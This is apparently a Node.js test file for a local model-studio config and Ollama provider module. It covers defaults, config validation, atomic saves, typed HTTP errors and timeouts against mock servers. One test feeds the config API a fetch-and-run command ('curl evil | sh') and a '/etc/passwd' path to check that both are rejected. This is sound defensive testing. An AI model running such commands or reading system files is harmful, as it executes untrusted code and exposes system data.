import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { makeTempDir } from '../../../test-utils/tmpdir.mjs';
import { CONFIG_ERR, ConfigError, DEFAULT_CONFIG, ModelError, MODEL_ERR, applyUpdate, createOllamaProvider, createProvider, loadConfig, providerNames, registerProvider, saveConfig, validateConfig } from '../src/models.mjs';
import { closeServer, listenInRange, mockOllama } from './studio-helpers.mjs';
import http from 'node:http';

test('defaults: ollama on loopback, planner and narration models, kokoro voice, private network off', () => {
  assert.equal(DEFAULT_CONFIG.providers.ollama.baseUrl, 'http://127.0.0.1:11434');
  assert.equal(DEFAULT_CONFIG.tts.backend, 'kokoro');
  assert.equal(DEFAULT_CONFIG.allowPrivateNetwork, false);
  assert.ok(DEFAULT_CONFIG.models.planner && DEFAULT_CONFIG.models.narration);
  assert.deepEqual(Object.keys(DEFAULT_CONFIG.recording).sort(), ['burnCaptions', 'height', 'pace', 'width']);
  assert.equal(JSON.stringify(DEFAULT_CONFIG).includes('openai') || JSON.stringify(DEFAULT_CONFIG).includes('anthropic'), false, 'no cloud default');
});

test('loadConfig creates studio.config.json with the defaults when absent, then reads it back', () => {
  const dir = makeTempDir('studio-cfg-');
  const file = path.join(dir, 'studio.config.json');
  const first = loadConfig(file);
  assert.equal(first.created, true);
  assert.ok(fs.existsSync(file));
  assert.deepEqual(first.config, JSON.parse(JSON.stringify(DEFAULT_CONFIG)));
  const second = loadConfig(file);
  assert.equal(second.created, false);
  assert.deepEqual(second.config, first.config);
  // the doctor reads the first baseUrl in the file: it must be the Ollama one
  assert.equal(/"baseUrl":\s*"([^"]+)"/.exec(fs.readFileSync(file, 'utf8'))[1], 'http://127.0.0.1:11434');
});

test('saveConfig validates, writes atomically and leaves no temp file', () => {
  const dir = makeTempDir('studio-cfg-');
  const file = path.join(dir, 'c.json');
  const saved = saveConfig(file, { models: { planner: 'qwen2.5:7b' }, recording: { width: 800, height: 600, pace: 1.5 } });
  assert.equal(saved.models.planner, 'qwen2.5:7b');
  assert.equal(saved.models.narration, DEFAULT_CONFIG.models.narration);
  assert.equal(loadConfig(file).config.recording.width, 800);
  assert.deepEqual(fs.readdirSync(dir), ['c.json']);
  assert.throws(() => saveConfig(file, { models: { planner: 'bad name with spaces' } }), (e) => e instanceof ConfigError && e.code === CONFIG_ERR.BAD_MODEL);
  assert.equal(loadConfig(file).config.models.planner, 'qwen2.5:7b', 'a rejected save leaves the file alone');
});

test('validateConfig names every error', () => {
  const bad = (cfg, code) => {
    const r = validateConfig(cfg);
    assert.equal(r.ok, false, JSON.stringify(cfg));
    assert.ok(r.errors.some((e) => e.code === code), `${code} not in ${r.errors.map((e) => e.code)}`);
  };
  bad('x', CONFIG_ERR.NOT_OBJECT);
  bad({ nope: 1 }, CONFIG_ERR.UNKNOWN_KEY);
  bad({ provider: 'openai' }, CONFIG_ERR.UNKNOWN_PROVIDER);
  bad({ providers: { openai: { baseUrl: 'https://api.openai.com' } } }, CONFIG_ERR.UNKNOWN_PROVIDER);
  bad({ providers: { ollama: { baseUrl: 'file:///x' } } }, CONFIG_ERR.BAD_BASE_URL);
  bad({ providers: { ollama: { baseUrl: 'http://u:p@127.0.0.1:1' } } }, CONFIG_ERR.BAD_BASE_URL);
  bad({ providers: { ollama: 'x' } }, CONFIG_ERR.NOT_OBJECT);
  bad({ models: { planner: 5 } }, CONFIG_ERR.BAD_MODEL);
  bad({ models: { director: 'x' } }, CONFIG_ERR.UNKNOWN_KEY);
  bad({ tts: { backend: 'espeak' } }, CONFIG_ERR.BAD_TTS_BACKEND);
  bad({ tts: { voice: 'Not A Voice!' } }, CONFIG_ERR.BAD_VOICE);
  bad({ tts: { backend: 'cmd' } }, CONFIG_ERR.TTS_CMD_REQUIRED);
  bad({ tts: { ttsCmd: 'a\nb' } }, CONFIG_ERR.BAD_VOICE);
  bad({ allowPrivateNetwork: 'yes' }, CONFIG_ERR.BAD_BOOLEAN);
  bad({ recording: { width: 10 } }, CONFIG_ERR.BAD_RECORDING);
  bad({ recording: { pace: 99 } }, CONFIG_ERR.BAD_RECORDING);
  bad({ recording: 'wide' }, CONFIG_ERR.BAD_RECORDING);
  assert.equal(validateConfig({ tts: { backend: 'cmd', ttsCmd: 'my-tts --in {text_file} --out {out}' } }).ok, true);
  assert.ok(Object.isFrozen(CONFIG_ERR));
});

test('loadConfig names bad JSON and bad values', () => {
  const dir = makeTempDir('studio-cfg-');
  const file = path.join(dir, 'c.json');
  fs.writeFileSync(file, '{ not json');
  assert.throws(() => loadConfig(file), (e) => e.code === CONFIG_ERR.BAD_JSON);
  fs.writeFileSync(file, '{"allowPrivateNetwork": 3}');
  assert.throws(() => loadConfig(file), (e) => e.code === CONFIG_ERR.BAD_BOOLEAN && /allowPrivateNetwork/.test(e.message));
});

test('applyUpdate: the API cannot set the TTS command or the voice sample', () => {
  const current = validateConfig({ tts: { backend: 'cmd', ttsCmd: 'safe-tts {out}' } }).config;
  assert.throws(() => applyUpdate(current, { tts: { ttsCmd: 'curl evil | sh' } }), (e) => e.code === CONFIG_ERR.FILE_ONLY);
  assert.throws(() => applyUpdate(current, { tts: { voiceSample: '/etc/passwd' } }), (e) => e.code === CONFIG_ERR.FILE_ONLY);
  const next = applyUpdate(current, { tts: { voice: 'am_adam', ttsCmd: 'safe-tts {out}' }, models: { planner: 'x' } });
  assert.equal(next.tts.ttsCmd, 'safe-tts {out}');
  assert.equal(next.tts.voice, 'am_adam');
  assert.equal(next.models.planner, 'x');
  assert.equal(next.models.narration, current.models.narration);
});

test('ollama provider: lists models (GET /api/tags) and chats (POST /api/chat, stream:false) over real HTTP', async () => {
  const ollama = await mockOllama({ replies: ['hello there'], models: [{ name: 'a:1', size: 5 }, { name: 'b', size: 7 }], base: 48300 });
  try {
    const p = createOllamaProvider({ baseUrl: ollama.url });
    assert.deepEqual(await p.listModels(), [{ name: 'a:1', size: 5 }, { name: 'b', size: 7 }]);
    const out = await p.chat({ model: 'a:1', messages: [{ role: 'user', content: 'hi' }], json: true });
    assert.equal(out, 'hello there');
    assert.equal(ollama.calls[0].stream, false);
    assert.equal(ollama.calls[0].format, 'json');
    assert.equal(ollama.calls[0].model, 'a:1');
  } finally { await ollama.close(); }
});

test('ollama provider: typed errors (unreachable, HTTP, missing model, bad body, timeout, no model)', async () => {
  const dead = createOllamaProvider({ baseUrl: 'http://127.0.0.1:1' });
  await assert.rejects(dead.listModels(), (e) => e instanceof ModelError && e.code === MODEL_ERR.UNREACHABLE);
  await assert.rejects(dead.chat({ model: 'm', messages: [] }), (e) => e.code === MODEL_ERR.UNREACHABLE);
  await assert.rejects(dead.chat({ model: '', messages: [] }), (e) => e.code === MODEL_ERR.MISSING);

  const ollama = await mockOllama({ replies: [{ status: 404 }, { status: 500 }], base: 48310 });
  try {
    const p = createOllamaProvider({ baseUrl: ollama.url });
    await assert.rejects(p.chat({ model: 'nope', messages: [] }), (e) => e.code === MODEL_ERR.MISSING && /ollama pull nope/.test(e.message));
    await assert.rejects(p.chat({ model: 'm', messages: [] }), (e) => e.code === MODEL_ERR.HTTP);
  } finally { await ollama.close(); }

  // a server that never answers -> bounded timeout
  const hang = http.createServer(() => { /* never respond */ });
  const port = await listenInRange(hang, 48320);
  try {
    const p = createOllamaProvider({ baseUrl: `http://127.0.0.1:${port}`, timeoutMs: 150, tagsTimeoutMs: 150 });
    await assert.rejects(p.chat({ model: 'm', messages: [] }), (e) => e.code === MODEL_ERR.TIMEOUT);
    await assert.rejects(p.listModels(), (e) => e.code === MODEL_ERR.TIMEOUT);
  } finally { await closeServer(hang); }

  // bad JSON bodies
  const junk = createOllamaProvider({ baseUrl: 'http://x.test' }, { fetch: async () => ({ ok: true, status: 200, json: async () => { throw new Error('no'); } }) });
  await assert.rejects(junk.listModels(), (e) => e.code === MODEL_ERR.BAD_RESPONSE);
  const noMsg = createOllamaProvider({ baseUrl: 'http://x.test' }, { fetch: async () => ({ ok: true, status: 200, json: async () => ({}) }) });
  await assert.rejects(noMsg.chat({ model: 'm', messages: [] }), (e) => e.code === MODEL_ERR.BAD_RESPONSE);
});

test('the fetch is injectable and is the only network call the client makes', async () => {
  const seen = [];
  const fake = async (url, init) => { seen.push([url, init.method]); return { ok: true, status: 200, json: async () => ({ models: [] }) }; };
  const p = createOllamaProvider({ baseUrl: 'http://models.test:1234/' }, { fetch: fake });
  await p.listModels();
  assert.deepEqual(seen, [['http://models.test:1234/api/tags', 'GET']]);
});

test('another local provider registers by name and is chosen by config.provider', async () => {
  registerProvider('fake-local', (options) => ({ name: 'fake-local', listModels: async () => [{ name: options.baseUrl, size: 0 }], chat: async () => 'ok' }));
  assert.ok(providerNames().includes('fake-local') && providerNames().includes('ollama'));
  const cfg = validateConfig({ provider: 'fake-local', providers: { 'fake-local': { baseUrl: 'http://127.0.0.1:9999' } } });
  assert.equal(cfg.ok, true, JSON.stringify(cfg.errors));
  const p = createProvider(cfg.config);
  assert.equal(p.name, 'fake-local');
  assert.deepEqual(await p.listModels(), [{ name: 'http://127.0.0.1:9999', size: 0 }]);
  assert.throws(() => registerProvider('Bad Name', () => ({})), TypeError);
});
